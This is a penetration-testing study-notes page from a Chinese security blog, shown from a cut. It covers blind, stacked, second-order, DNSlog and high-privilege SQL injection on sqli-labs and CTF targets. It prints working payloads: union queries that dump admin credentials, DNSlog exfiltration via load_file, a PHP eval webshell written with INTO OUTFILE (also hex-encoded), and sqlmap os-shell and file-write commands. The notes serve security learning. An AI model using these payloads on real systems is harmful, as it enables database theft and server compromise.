+<li>and if(ascii(substr(database(),1,1))=115,sleep(5),1)–+</li>
+<li>and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)–+</li>
+</ul>
+<p>#案例4-Sqlilabs-less46注入测试（排序盲注）</p>
+<p>参考注入天书</p>
+<p>#案例5-引出实战-某CMS黑盒测试SQL查询注入</p>
+<ul>
+<li>黑盒测试发布修改(insert,update)盲注测试<ul>
+<li>‘ and left(database(),1)&gt;’z’ or ‘ 返回0</li>
+<li>‘ and left(database(),1)=’z’ or ‘ 返回1</li>
+<li>‘ and left(database(),2)=’zz’ or ‘ 返回1</li>
+<li>‘ and left(database(),5)=’zzcms’ or ‘ 返回1</li>
+<li><img src="/source/images/image-20210731131731783.png" alt="image-20210731131731783"></li>
+<li><img src="/source/images/image-20210731131749308.png" alt="image-20210731131749308"></li>
+<li><img src="/source/images/image-20210731131838109.png" alt="image-20210731131838109"></li>
+<li><img src="/source/images/image-20210731132003828.png" alt="image-20210731132003828"></li>
+</ul>
+</li>
+</ul>
+<h2 id="19、Dnslog-amp-堆叠-amp-二次-amp-高权限注入"><a href="#19、Dnslog-amp-堆叠-amp-二次-amp-高权限注入" class="headerlink" title="19、Dnslog&amp;堆叠&amp;二次&amp;高权限注入"></a>19、Dnslog&amp;堆叠&amp;二次&amp;高权限注入</h2><p>#案例1-堆叠注入-BUUCTF-[强网杯 2019]随便注</p>
+<p>适用场景：在网站禁掉了select、where等关键字后，可以尝试看存不存在堆叠注入</p>
+<p>检测堆叠注入：</p>
+<ul>
+<li><p>如果是数字型，直接在后面加上分号 ; 看页面是否正常，不正常则代表不存在堆叠注入</p>
+</li>
+<li><p>如果是字符型，在闭合单引号的情况下，然后加上分号 ; 如果页面正常，则存在堆叠注入</p>
+</li>
+<li><p>```python<br>解题方法一：堆叠注入：根据数据库类型决定是否支持多条语句执行’;show databases;’;show tables;’;show columns from <code>1919810931114514</code>;’;select flag from <code>1919810931114514</code>;     #这是错误写法，因为select被过滤了#下面语句中的 0x73656c656374202a2066726f6d20603139313938313039333131313435313460 是注入语句：select * from <code>1919810931114514</code>  转换成16进制的，这里因为表  1919810931114514 是纯数字，所以必须要用 <code>  </code>   这两个符号基本原理：首先将注入语句转成16进制（数据库支持16进制），接着将数据赋值给局部变量a(@代表局部声明变量)，接着再次预编译 局部变量a，将其放在 execsql里，最后执行execsql’;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;解题方法二参考连接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/peri0d/p/12123814.html%E5%8E%9F%E7%90%86%EF%BC%9A%E4%B8%80%E5%85%B12%E4%B8%AA%E8%A1%A8%EF%BC%8C%E4%B8%80%E4%B8%AA%E8%A1%A8%E6%98%AFflag%EF%BC%8C%E4%B8%80%E4%B8%AA%E6%98%AFwords%EF%BC%8C%E6%89%80%E4%BB%A5%E9%BB%98%E8%AE%A4%E7%9A%84%E8%A1%A8%E4%B8%80%E5%AE%9A%E6%98%AFwords%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AA%E9%9C%80%E8%A6%81%E5%B0%86%E5%8E%9F%E6%9D%A5%E7%9A%84flag%E8%A1%A8%E6%94%B9%E4%B8%BAwords%E5%8D%B3%E5%8F%AF%E3%80%82%E9%A6%96%E5%85%88%E5%B0%86words%E9%9A%8F%E4%BE%BF%E6%94%B9%E4%B8%AA%E5%90%8D%E5%AD%97%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86flag%E9%87%8D%E5%91%BD%E5%90%8D%E4%B8%BAwords%EF%BC%8C%E6%89%80%E4%BB%A5%E6%96%B0%E7%9A%84words%E8%A1%A8%E9%87%8C%E5%92%8C%E5%8E%9F%E6%9D%A5%E7%9A%84flag%E9%87%8C%E5%82%A8%E5%AD%98%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E4%B8%80%E6%A0%B7%E7%9A%84%EF%BC%8C%E6%88%91%E4%BB%AC%E6%8E%A5%E7%9D%80%E9%80%9A%E8%BF%87%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%EF%BC%8C%E5%8D%B3%E5%8F%AF%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96flag/?inject=1&#39;;RENAME">https://www.cnblogs.com/peri0d/p/12123814.html原理：一共2个表，一个表是flag，一个是words，所以默认的表一定是words，我们只需要将原来的flag表改为words即可。首先将words随便改个名字，然后将flag重命名为words，所以新的words表里和原来的flag里储存的数据是一样的，我们接着通过另一个查询语句，即可成功获取flag/?inject=1&#39;;RENAME</a> TABLE <code>words</code> TO <code>words1</code>;RENAME TABLE <code>1919810931114514</code> TO <code>words</code>;ALTER TABLE <code>words</code> CHANGE <code>flag</code> <code>id</code> VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23查询flag：   /?inject=1’ or ‘1’=’1   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例2-二次注入-BUUCTF-[RCTF2015]EasySQL</span><br><span class="line"></span><br><span class="line">- 应用场景：留言、评论、新用户注册的昵称</span><br><span class="line"></span><br><span class="line">  - 网站对用户存储的语句仅仅通过对部分字符进行转义来防止sql注入，接着又将该语句存储到数据库中了（比如留言，新注册的用户的昵称），为了用户存储和显示的内容一致，所以就将转义前的语句存储起来了，这样既保持了用户数据的一致性，也杜绝了sql注入，但是却可以产生二次注入</span><br><span class="line"></span><br><span class="line">- 利用方法：</span><br><span class="line"></span><br><span class="line">  - 首先判断当前位置过滤了啥，比如我们在用户名处插入payload，很大几率失败(用户名格式不正确)，所以我们需要通过fuzz搞清楚它到底过滤了什么关键字或者字符</span><br><span class="line">    - 注册账户抓包，然后将用户名那里设置变量，加载fuzz字典，接着观察看哪些字符可以使用</span><br><span class="line">      - 易错点：记得把空格加进去，有很多地方过滤了空格</span><br><span class="line">  - 其次需要写入sql语句，存储到网站</span><br><span class="line">  - 最后调用之前写入的内容</span><br><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  功能点：注册（昵称构造payload）-登录-修改（就会触发数据库对该用户和其相关信息的匹配，从而导致二次注入）（insert-select-update）确定注入点-构造Payload-确定过滤-重新构造Payload#构造初始payload，发现错误，提示用户名不合法x&quot; or updatexml(1,concat(0x7e,(version())),0)##下面这个语句就可以创建用户成功，因为通过fuzz发现过滤的是空格，但是删除空格，or就和sql语句连在一起了，所以我们完全可以用字符  ^  来代替  or   效果是一致的，却绕过了空格过滤x&quot;^updatexml(1,concat(0x7e,(version())),0)##注册成功就开始登录#易错点：登录的账号要注意，我们的账号是包含payload的，比如这里的账号就是 x&quot;^updatexml(1,concat(0x7e,(version())),0)#   #接下来点击我们的用户名----点击修改密码来触发数据库对当前用户名的比对，因为我们的用户名后面又注释符 # ，而正常的更新密码的语句一般为：update user set new_passwd=&#x27;新密码&#x27; where username = &#x27;用户名&#x27; and old_passwd = &#x27;旧密码&#x27;     ，所以我们的旧密码完全可以随便输入，因为注释符的存在，所以旧密码无论是啥都没关系案例截图：详见当前代码框下面的截图#下面的代码为获取详细的flag的注入语句test&quot;^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)#test&quot;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1)#test&quot;^updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag))),1)#test&quot;^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;(column_name)regexp(&#x27;^r&#x27;))),1)#test&quot;^updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users))),1)#test&quot;^updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),1)##得到flag的一部分：flag&#123;94ed4b89-f8b7-4997-8df4-e4    这是因为长度限制了，所以需要逆向的再获取flagtest&quot;^updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)))),1)##1、得到逆向代码：       &#125;e70e54e0414e-4fd8-7994-7b8f-98接着将得到的逆向的flag进行反转，使用如下代码：    a = &#x27;:&#125;e70e54e0414e-4fd8-7994-7b8f-98&#x27;    a = a[::-1]    print(a)   #结果为：    89-f8b7-4997-8df4-e4140e45e07e&#125;:       #2、和正向的进行拼接 发现2部分falg在4997-e4这里都是重复的，所以只需要不全e4后面的代码   140e45e07e&#125; 即可flag&#123;94ed4b89-f8b7-4997-8df4-e4140e45e07e&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="/source/images/image-20210731210448334.png" alt="image-20210731210448334"></li>
+<li><img src="/source/images/image-20210731210503368.png" alt="image-20210731210503368"></li>
+<li><img src="/source/images/image-20210731210514495.png" alt="image-20210731210514495"></li>
+</ul>
+</li>
+</ul>
+<p>#案例3-Dnslog注入-本地Sqlilabs注入&amp;命令执行等</p>
+<ul>
+<li><p>特性：比较鸡肋，需要满足多个条件</p>
+<ul>
+<li>windows</li>
+<li>存在注入点</li>
+<li>需要支持load_file()函数</li>
+<li>需要secure_file_priv 需要为空：需要在配置文件里修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启即可<ul>
+<li><img src="/source/images/image-20210801165434310.png" alt="image-20210801165434310"></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>```python<br>应用场景：解决不回显，反向连接，SQL注入，命令执行，SSRF等ping test.dbuh8a.ceye.ioping %USERNAME%.dbuh8a.ceye.ioselect load_file(‘\\xxxx.dbuh8a.ceye.io\aa’));select load_file(concat(‘\\‘,(select database()),’.dbuh8a.ceye.io\aa’));</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20210731214622552](/source/images/image-20210731214622552.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例4-高权限注入-跨库查询&amp;文件读取&amp;文件写入</span><br><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  实验：root xiaodi用户登录测试不同数据库用户数据操作，文件操作系统用户：所有数据库可看，文件读写正常普通用户：单个数据库可看，文件读写失败跨库查询猜解select load_file()select &#x27;a&#x27; into outfile &#x27;d:/www.txt&#x27;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="20、权限注入-amp-跨库-amp-文件读写-amp-命令执行"><a href="#20、权限注入-amp-跨库-amp-文件读写-amp-命令执行" class="headerlink" title="20、权限注入&amp;跨库&amp;文件读写&amp;命令执行"></a>20、权限注入&amp;跨库&amp;文件读写&amp;命令执行</h2><p>核心：首先判断是不是高权限用户，如果是，那么直接按照本课的命令进行高权限操作，如果不是，则进行普通的注入即可</p>
+<ul>
+<li>因为不同的数据库的高权限用户的叫法不一样，所以推荐使用sqlmap来进行判断<ul>
+<li>python3 sqlmap.py -u “xx.xx.xx.xx/?id=1”  –is-dba    </li>
+<li>如果返回True，则代表是高权限用户，就可以进行命令执行、跨库、文件操作、注册表操作、sql操作</li>
+</ul>
+</li>
+</ul>
+<p>1、高权限注入应用及原理判断</p>
+<p>2、那些数据库存在高权限注入操作</p>
+<p>3、高权限注入可操作具体有哪些方面</p>
+<ul>
+<li>linux上的mysql可以执行系统命令</li>
+<li>mysql在修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启之后，可以执行读取与写入操作</li>
+</ul>
+<p>#案例1-MYSQL跨库-手工演示对比工具说明</p>
+<p>什么是跨库？</p>
+<ul>
+<li><p>工具sqlmap进行跨库：使用 –tables能获取到所有的表，那么就是跨库</p>
+</li>
+<li><p>使用手工进行跨库</p>
+<ul>
+<li>```python<br>场景说明：A存在高权限注入导致同一数据库其他WEB应用数据泄露WEB应用A-<a target="_blank" rel="noopener" href="http://127.0.0.1:8081/sqlilabs/WEB%E5%BA%94%E7%94%A8B-http://127.0.0.1:8081/maccms8/#information_schema%E6%95%B0%E6%8D%AE%E5%BA%93%E9%87%8C%E6%9C%89%E4%B8%AA%E8%A1%A8schemata%E9%87%8C%E5%82%A8%E5%AD%98%E4%BA%86%E6%89%80%E6%9C%89%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%EF%BC%8C%E8%80%8C%E8%AF%A5%E8%A1%A8%E9%87%8C%E9%9D%A2%E7%9A%84%E5%AD%97%E6%AE%B5SCHEMA_NAME%E4%B8%8B%E5%B0%B1%E6%98%AF%E6%89%80%E6%9C%89%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%90%8D%E5%AD%97">http://127.0.0.1:8081/sqlilabs/WEB应用B-http://127.0.0.1:8081/maccms8/#information_schema数据库里有个表schemata里储存了所有的数据库信息，而该表里面的字段SCHEMA_NAME下就是所有的数据库的名字</a>     select SCHEMA_NAME from information_schema.schemata;-1 union select 1,group_concat(SCHEMA_NAME),3 from information_schema.schemata–+#通过上一步获取到我们需要的数据库的名字：maccms#必须要通过限定数据库名为maccms才能查询到它里面的表-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’maccms’–+-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’mac_manager’ and table_schema=’maccms’–+#这里需要注意：因为是跨库，所以当我们从跨表查询数据，必须要加一个限定条件，比如哪个数据库、哪个表，两者用一个点 . 进行连接：maccms.mac_manager-1 union select 1,m_name,m_password from maccms.mac_manager–+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">\#案例2-MYSQL读写-手工演示对比工具说明</span><br><span class="line"></span><br><span class="line">- 缺点：都必须要在配置文件里修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启即可，所以有很大的局限性</span><br><span class="line"></span><br><span class="line">- ```python</span><br><span class="line">  场景说明：WEB应用存在高权限注入点导致文件直接读写(后门植入)前提：知道绝对路径工具：Pangolin#可读取敏感文件，比如etc/passwd#易错点：需要在配置文件里修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启即可-1 union select 1,load_file(&#x27;d:/test.txt&#x27;),3--+#当我们知道绝对路径，直接往绝对路径里写入一句话即可#比如这里的x可以替换成一句话， #易错点：需要在配置文件里修改mysql.ini或my.ini文件，在[mysqld]下加入    secure_file_priv =   然后重启即可-1 union select 1,&#x27;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&#x27;,3 into outfile &#x27;d:/www.txt&#x27;--+#易错点：如果网站做了防护，限制单引号或者eval等关键字的写入怎么办？	可以将一句话木马连同单引号转换为hex，通过小葵转换工具即可转换，因为在数据库中，hex的16进制也可以直接识别的   &#x27;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&#x27;     select 1,0x273C3F70687020406576616C28245F504F53545B2761747461636B275D293B3F3E27,3 into outfile &#x27;d:/shell.php&#x27;;WEB应用路径获取：说明文件,报错显示,特定源码爆出,配合读取中间件配置，爆破等	说明文件：比如phpadmin    特定源码：比如公开的cms里的目录结构    中间件配置：比如 宝塔，一般在绑定域名和路径的时候会需要设置，然后我们可以通过读取它的中间件的配置文件来获取绝对路径</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><img src="/source/images/image-20210801140021509.png" alt="image-20210801140021509"></p>
+<p>​        <img src="/source/images/image-20210801172128323.png" alt="image-20210801172128323"></p>
+</li>
+</ul>
+<p>#案例3-MSSQL注入-跨库&amp;文件读写&amp;命令执行</p>
+<p>工具：Pangolin 对比MYSQL或其他数据库可操作方面</p>
+<p>#案例4-ORACLE注入-工具可操作自动识别攻击</p>
+<ul>
+<li><pre><code class="python">SQLMAP--current-user 当前用户--is-dba     是否为管理员--file-read  从服务器读入，后面加上绝对路径，比如 &quot;d:/1.txt&quot; --file-write 从本地写入，和--file-dest搭配使用--file-dest  写入目标路径，和--file-write搭配使用#实列：   --file-write  &quot;e:/xiaoma.txt&quot;   --file-dest &quot;c:/www/1.php&quot; #上面的意思就是将我本地电脑下的xiiaoma.txt的内容写到目标服务器的www的目录下，并且保存为1.php--sql-shell  执行sql命令终端--os-shell  执行shell终端,会反弹一个shell回来，可以执行系统操作命令，并且返回一个url地址，该地址是一个上传文件的地址，我们可以通过该地址上传不容易被杀的马，然后拿下服务器权限（--os-cmd=ver 自定义命令（这里的ver是获取操作系统的版本） --os-cmd=OSCMD//执行操作系统命令--os-shell //反弹一个osshell--os-pwn //pwn，反弹msf下的shell或者vnc--os-smbrelay //反弹msf下的shell或者vnc--os-bof //存储过程缓存溢出--priv-esc //数据库提权#下面这2个语句是操作注册表的–reg-read –reg-add –reg-del –reg-key       --reg-value --reg-data --reg-typepython sqlmap.py -u &quot;http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot; --file-read &quot;d:/test.txt&quot;python sqlmap.py -u &quot;http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot; --file-write &quot;f:/host.txt&quot; --file-dest &quot;D:/phpstudy/PHPTutorial/WWW/sqlilabs/1.txt&quot;python sqlmap.py -u &quot;http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot; --sql-shellselect * from mysql.userpython sqlmap.py -u &quot;http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot; --os-shell
+</code></pre>
+</li>
+</ul>
+<p>#案例5-脚本语言SQL注入-PHP&amp;Javaweb&amp;Python</p>
+<ul>
+<li>语法，内置安全，结构等差异</li>
+</ul>
+<h2 id="—————SQL注入总结———"><a href="#—————SQL注入总结———" class="headerlink" title="—————SQL注入总结———-"></a>—————SQL注入总结———-</h2><p>SQL注入-安全测试思路总结</p>
+<ul>
+<li><p>漏洞判定-黑盒&amp;白盒</p>
+</li>
+<li><p>漏洞利用</p>
+<ul>
+<li>​    参数类型 <ul>
+<li>决定是否闭合单引号</li>
+</ul>
+</li>
+<li>​    数据库类型<ul>
+<li>不同的数据库注入方法不一样</li>
+</ul>
+</li>
+<li>​    数据提交方式<ul>
+<li>不同的提交方式注入的位置不一样</li>
+</ul>
+</li>
+<li>​    数据SQL查询方式<ul>
+<li>不同的查询方式决定着是否是回显或者盲注</li>
+</ul>
+</li>
+<li>​    数据是否加密编码等<ul>
+<li>必须要将payload进行相同的编码才能注入</li>
+</ul>
+</li>
+<li>​    数据是否存在回显等</li>
+<li>​    注入权限是否高权限<ul>
+<li>有高权限，直接通过高权限进行操作</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>漏洞危害</p>
+<ul>
+<li>​    单个数据库数据泄露<ul>
+<li>普通用户</li>
+</ul>
+</li>
+<li>​    所有数据库数据泄露<ul>
+<li>高权限用户，跨库</li>
+</ul>
+</li>
+<li>​    后台权限丢失-数据配合后台登录等</li>
+<li>​    WEB权限丢失-文件操作,命令执行等</li>
+<li>​    可能后续导致服务器权限丢失等</li>
+</ul>
+</li>
+<li><p>漏洞特点</p>
+<ul>
+<li>​    1.开发语言决定SQL注入产生率<ul>
+<li>php的sql注入多，java和python相对而言就比较少了</li>
+</ul>
+</li>
+<li>​    2.数据库类型决定SQL注入利用过程</li>
+<li>​    3.部分SQL注入发现需人工进行探针<ul>
+<li>比如在查询方式为update、insert、delete的时候产生的注入，一般工具探测不到</li>
+</ul>
+</li>
+<li>​    4.防护SQL注入代码过滤或部署WAF</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/08/10/13-15%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/" rel="prev" title="13-15、渗透测试(xiaodi)">
+      <i class="fa fa-chevron-left"></i> 13-15、渗透测试(xiaodi)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/08/10/21-25%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/" rel="next" title="21-25、渗透测试(xiaodi)">
+      21-25、渗透测试(xiaodi) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#17%E3%80%81SQL%E6%B3%A8%E5%85%A5-amp-Json-amp-Base64-amp-%E6%A0%BC%E5%BC%8F%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.</span> <span class="nav-text">17、SQL注入&amp;Json&amp;Base64&amp;格式类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#18%E3%80%81SQL%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F-amp-%E5%B8%83%E5%B0%94-amp-%E5%BB%B6%E6%97%B6-amp-%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.</span> <span class="nav-text">18、SQL查询方式&amp;布尔&amp;延时&amp;报错盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="nav-number">2.1.</span> <span class="nav-text">盲注基本知识</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#19%E3%80%81Dnslog-amp-%E5%A0%86%E5%8F%A0-amp-%E4%BA%8C%E6%AC%A1-amp-%E9%AB%98%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">19、Dnslog&amp;堆叠&amp;二次&amp;高权限注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#20%E3%80%81%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5-amp-%E8%B7%A8%E5%BA%93-amp-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99-amp-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">4.</span> <span class="nav-text">20、权限注入&amp;跨库&amp;文件读写&amp;命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94%E2%80%94"><span class="nav-number">5.</span> <span class="nav-text">—————SQL注入总结———-</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="painter"
+      src="/images/%E5%A4%B4%E5%83%8F.jpg">
+  <p class="site-author-name" itemprop="name">painter</p>
+  <div class="site-description" itemprop="description">painter的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://lishang520.github.io/" title="GitHub → https:&#x2F;&#x2F;lishang520.github.io&#x2F;"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">painter安全技术博客</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">180k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:44</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '58W9BPsri2U8s70HBxhy6tS6-gzGzoHsz',
+      appKey     : 'XsON9yD3oGzDCQskxtiPhGFj',
+      placeholder: "ヾﾉ≧∀≦)o快来评论一下吧!",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
